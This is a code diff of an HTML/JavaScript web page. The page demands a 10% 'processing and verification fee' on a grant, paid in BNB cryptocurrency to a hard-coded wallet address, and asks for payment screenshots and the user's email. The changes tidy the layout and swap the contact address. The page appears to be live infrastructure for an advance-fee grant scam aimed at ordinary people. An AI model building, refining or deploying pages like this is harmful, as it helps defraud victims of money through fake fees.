@@ -9,7 +9,7 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
   <style>
     body { background: linear-gradient(135deg,#0b2540,#0f3b63 60%, #123a66); font-family:Inter,system-ui,Arial; min-height:100vh; color:white; }
-    .container { max-width:980px; margin:20px auto; padding:16px; }
+    .container { max-width:980px; margin:60px auto; padding:16px; }
     .card { background: rgba(255,255,255,0.04); border-radius:12px; padding:18px; box-shadow: 0 8px 30px rgba(2,6,23,0.12); color: white; }
     h1,h2 { margin:0 0 10px 0; color:white; }
     .muted { color: rgba(255,255,255,0.75); font-size:0.95rem; margin-bottom:8px; }
@@ -26,19 +26,59 @@
   </style>
 </head>
 <body>
-<div class="card">
-  <h2>Processing Fee Payment</h2>
+<div class="container">
+  <div class="card">
+    <h2>Processing Fee Payment</h2>
 
-  To complete your transaction, a 10% processing fee is required. Please purchase Binance Smart Chain (BNB) and send the corresponding amount to the wallet address below.<br><br>
+    To complete your transaction, a 10% processing fee is required. Please purchase Binance Smart Chain (BNB) and send the corresponding amount to the wallet address below.<br><br>
 
-  <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
-    <input type="text" value="0x6eD2F5Bb78dfc51EdB6d5A6b146C40456d0E6f4C" id="bnbWallet" class="readonly" readonly style="flex:1; min-width:0; padding:6px 10px; border-radius:6px; border:1px solid rgba(255,255,255,0.1); background: rgba(255,255,255,0.05); color:white;"/>
-    <button class="btn secondary" onclick="copyWallet()">Copy</button>
-  </div><br>
+    <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
+      <input type="text" value="0x6eD2F5Bb78dfc51EdB6d5A6b146C40456d0E6f4C" id="bnbWallet" class="readonly" readonly style="flex:1; min-width:0; padding:6px 10px; border-radius:6px; border:1px solid rgba(255,255,255,0.1); background: rgba(255,255,255,0.05); color:white;"/>
+      <button class="btn secondary" onclick="copyWallet()">Copy</button>
+    </div><br>
 
-  After sending the payment, take a screenshot of the transaction as proof and submit it via email. Make sure your sender account is visible in the screenshot.<br><br>
+    After sending the payment, take a screenshot of the transaction as proof and submit it via email. Make sure your sender account is visible in the screenshot.<br><br>
 
-  Double-check the wallet address before sending. Once your payment and proof are confirmed, your processing fee will be cleared, and your transaction will be processed.
+    Double-check the wallet address before sending. Once your payment and proof are confirmed, your processing fee will be cleared, and your transaction will be processed.
+  </div>
+
+  <div id="loading" class="muted" style="margin-top:24px;">Loading grant information…</div>
+
+  <div id="grantDetails" style="display:none; margin-top:24px; padding:12px; background: rgba(255,255,255,0.03); border-radius:12px;">
+    <h2 id="grantSector" style="margin-bottom:8px;">—</h2>
+    <div class="muted" id="grantOccupation" style="margin-bottom:12px;">—</div>
+
+    <div class="row" style="margin-top:12px; gap:12px;">
+      <div class="col">
+        <label>Requested Amount (GBP)</label>
+        <input id="requestedAmount" class="readonly" readonly />
+      </div>
+      <div class="col">
+        <label>Processing & Verification Fee (10%)</label>
+        <input id="feeAmount" class="readonly" readonly />
+      </div>
+    </div>
+
+    <form id="checkoutForm" style="margin-top:16px;">
+      <div class="field">
+        <label for="email">Your Email</label>
+        <input type="email" id="email" name="email" placeholder="e.g. user@example.com" required />
+        <small class="small">Email you are sending the grading from.</small>
+      </div>
+
+      <div class="field">
+        <label for="notes">Remarks / Notes (optional)</label>
+        <textarea id="notes" name="notes" rows="4" placeholder="Add any comments or observations"></textarea>
+      </div>
+
+      <div style="display:flex; gap:10px; align-items:center; margin-top:12px;">
+        <button type="button" id="sendEmailBtn" class="btn">Send Grading via Email</button>
+        <button type="button" id="cancelBtn" class="btn secondary">Cancel</button>
+      </div>
+    </form>
+
+    <div id="message" style="margin-top:12px;"></div>
+  </div>
 </div>
 
 <script>
@@ -47,50 +87,9 @@ function copyWallet() {
   walletInput.select();
   walletInput.setSelectionRange(0, 99999); // For mobile devices
   document.execCommand("copy");
-
   alert("Wallet address copied to clipboard!");
 }
 </script>
-    <div id="loading" class="muted">Loading grant information…</div>
-
-    <div id="grantDetails" style="display:none; margin-top:12px;">
-      <h2 id="grantSector">—</h2>
-      <div class="muted" id="grantOccupation">—</div>
-
-      <div class="row" style="margin-top:12px;">
-        <div class="col">
-          <label>Requested Amount (GBP)</label>
-          <input id="requestedAmount" class="readonly" readonly />
-        </div>
-        <div class="col">
-          <label>Processing & Verification Fee (10%)</label>
-          <input id="feeAmount" class="readonly" readonly />
-        </div>
-      </div>
-
-      <form id="checkoutForm" style="margin-top:14px;">
-        <div class="field">
-          <label for="email">Your Email</label>
-          <input type="email" id="email" name="email" placeholder="e.g. user@example.com" required />
-          <small class="small">Email you are sending the grading from.</small>
-        </div>
-
-        <div class="field">
-          <label for="notes">Remarks / Notes (optional)</label>
-          <textarea id="notes" name="notes" rows="4" placeholder="Add any comments or observations"></textarea>
-        </div>
-
-        <div style="display:flex; gap:10px; align-items:center; margin-top:12px;">
-          <button type="button" id="sendEmailBtn" class="btn">Send Grading via Email</button>
-          <button type="button" id="cancelBtn" class="btn secondary">Cancel</button>
-        </div>
-      </form>
-
-      <div id="message" style="margin-top:12px;"></div>
-    </div>
-  </div>
-</div>
-
 <script type="module">
 import { auth, db } from './firebase.js';
 import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
@@ -190,7 +189,7 @@ sendEmailBtn.addEventListener('click', async () => {
     showMessage('Remarks saved! Preparing your email...');
 
     // Open email client
-    const recipient = "help.globuk@gmail.com";
+    const recipient = "grading@globuk.com";
     const subject = encodeURIComponent(`Grading Submission - ${currentGrant.sector || 'Grant'}`);
     const body = encodeURIComponent(
       `Hello,\n\nI am submitting my grading for the grant in sector "${currentGrant.sector || '—'}".\n\nFrom: ${fromEmail}\nRemarks: ${notes || '(No remarks)'}\nProcessing Fee: £${fee}\n\nThank you.`
